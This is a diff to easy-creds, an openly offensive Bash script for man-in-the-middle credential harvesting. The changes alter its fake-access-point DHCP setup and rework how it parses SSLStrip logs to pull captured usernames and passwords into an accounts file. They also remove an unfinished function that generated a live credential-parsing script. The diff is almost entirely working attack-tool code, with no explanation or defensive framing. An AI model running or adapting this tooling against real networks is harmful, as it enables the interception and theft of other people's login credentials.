@@ -5,7 +5,7 @@
 #                                                                                                                #
 # J0hnnyBrav0 (@Brav0hax) & al14s (@al14s)                                                                       #
 ##################################################################################################################
-# v3.7-pwnie edition 10/16/2012
+# v3.7-pwnie edition 10/17/2012
 #
 # Copyright (C) 2012  Eric Milam
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
@@ -550,14 +550,19 @@ f_fakeapAttack(){
 f_dhcpconf(){
 	valid=
 	while [[ $valid != 1 ]]; do
-	 read -e -p "Path to the dhcpd.conf file [/etc/dhcp/]: " DHCPPATH
+	 read -e -p "Path to the dhcpd.conf file [/etc/dhcp/dhpcd.conf]: " DHCPPATH
 	 if [ -z "$DHCPPATH" ]; then DHCPPATH=/etc/dhcp/dhcpd.conf; fi
-	 if [ ! -f "$DHCPPATH" ]; then
+	 
+	if [ ! -f "$DHCPPATH" ]; then
 		echo -e "File not found - $DHCPPATH\n"
 	 else
 		valid=1
 	 fi
 	done
+
+	cat $DHCPPATH > /tmp/ec/dhcp.conf
+	mv /tmp/ec/dhcp.conf /etc/dhcp/dhcpd.conf
+	DHCPPATH=/etc/dhcp/dhcp.conf
 
 	#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
 	ATNET=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f2)
@@ -1268,16 +1273,14 @@ f_SSLStrip(){
 	clear
 	f_Banner
 	
-	touch /$PWD/strip-accts.txt
-	stripaccts=strip-accts.txt-$(date +%F-%H%M).txt
-
 	if [ -d $logfldr ]; then
 	  echo "SSLStrip logs in current log folder:"
 	  ls $logfldr/sslstrip* 2>/dev/null
 	  echo -e "\n\n"
-	fi 
+	fi
 
-	if [ -e /$PWD/strip-accts.txt ]; then rm "$stripaccts"; fi
+	stripaccts=/$PWD/strip-accts.txt-$(date +%F-%H%M).txt
+	touch $stripaccts
 
 	# Coded with help from 'Crusty Old Fart' - Ubuntu Forums
 	LOGPATH=
@@ -1300,8 +1303,7 @@ f_SSLStrip(){
 
 		if [ "$GREPSTR" ]; then
 			echo -n "$VAL1" "- " >> "$stripaccts"
-			echo "$GREPSTR" | \
-			sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> "$stripaccts"
+			echo "$GREPSTR" | sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> "$stripaccts"
 		fi
 		i=$[$i+1]
 	done
@@ -1311,55 +1313,13 @@ f_SSLStrip(){
 	elif [ -s "$stripaccts" ] && [ ! -z $isxrunning ]; then
 	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat "$stripaccts" &
 	else
-	 echo -e "\n\e[1;31m[-] Sorry no credentials captured...\e[0m"
+	 echo -e "\n\e[1;31m[-] Sorry no credentials found in the log file...\e[0m"
+	 sleep 5
 	fi
 }
 
 
 #######################################################
-f_SSLStripLive(){
-
-#This function has not been implemented yet. Not sure I can get it going the way I want to :(
-
-	clear
-	f_Banner
-
-	# Live account review idea borrowed from ComaX and his MiTM script YAMAS
-	echo "looseparse() {" > /tmp/ec/looseparse.sh
-	echo "DEFS=\/pentest\/easy-creds\/definitions.sslstrip)" >> /tmp/ec/looseparse.sh
-	echo "LOGPATH=$logfldr/$sslstripfilename" >> /tmp/ec/looseparse.sh
-	echo "i=1" >> /tmp/ec/looseparse.sh
-	echo "while :"  >> /tmp/ec/looseparse.sh
-	echo "do" >> /tmp/ec/looseparse.sh
-	echo "while [ \$i -le \$NUMLINES ]; do" >> /tmp/ec/looseparse.sh
-	echo "	VAL1=\$(awk -v k=\$i 'FNR == k {print \$1}' '\$DEFS')"  >> /tmp/ec/looseparse.sh
-	echo "	VAL2=\$(awk -v k=\$i 'FNR == k {print \$2}' '\$DEFS')"  >> /tmp/ec/looseparse.sh
-	echo "	VAL3=\$(awk -v k=\$i 'FNR == k {print \$3}' '\$DEFS')"  >> /tmp/ec/looseparse.sh
-	echo "	VAL4=\$(awk -v k=\$i 'FNR == k {print \$4}' '\$DEFS')"  >> /tmp/ec/looseparse.sh
-	echo "	GREPSTR=\$(grep -a \$VAL2 \$LOGPATH | grep -a \$VAL3 | grep -a \$VAL4)"  >> /tmp/ec/looseparse.sh
-	echo >> /tmp/ec/looseparse.sh
-	echo "	if [ \$GREPSTR ]; then"  >> /tmp/ec/looseparse.sh
-	echo "		echo -n \$VAL1 '- ' >> /\$PWD/strip-accts.txt"  >> /tmp/ec/looseparse.sh
-	echo "		echo \$GREPSTR | sed -e 's/.*'\$VAL3'=/'\$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> /\$PWD/strip-accts.txt"  >> /tmp/ec/looseparse.sh
-	echo "	fi"  >> /tmp/ec/looseparse.sh
-	echo >> /tmp/ec/looseparse.sh 
-	echo "	i=\$[\$i+1]"  >> /tmp/ec/looseparse.sh
-	echo "done"  >> /tmp/ec/looseparse.sh
-	echo >> /tmp/ec/looseparse.sh
-	echo "}"  >> /tmp/ec/looseparse.sh
-	echo "looseparse"  >> /tmp/ec/looseparse.sh
-	chmod 755 /tmp/ec/looseparse.sh
-
-	if [ -z $isxrunning ]; then
-	 screen -S easy-creds -t SSLStrip-Accounts -X screen /tmp/ec/looseparse.sh & looseparse=$!
-	else
-	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e /tmp/ec/looseparse.sh & looseparse=$!
-	 sleep 2
-	fi
-}
-
-
-##################################################
 f_dsniff(){
 	clear
 	f_Banner
@@ -1638,6 +1598,7 @@ if [ "$(id -u)" != "0" ]; then
 	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
 	exit 1
 else
+	mkdir /tmp/ec/
 	f_isxrunning
 	f_xtermwindows
 	f_declarepaths
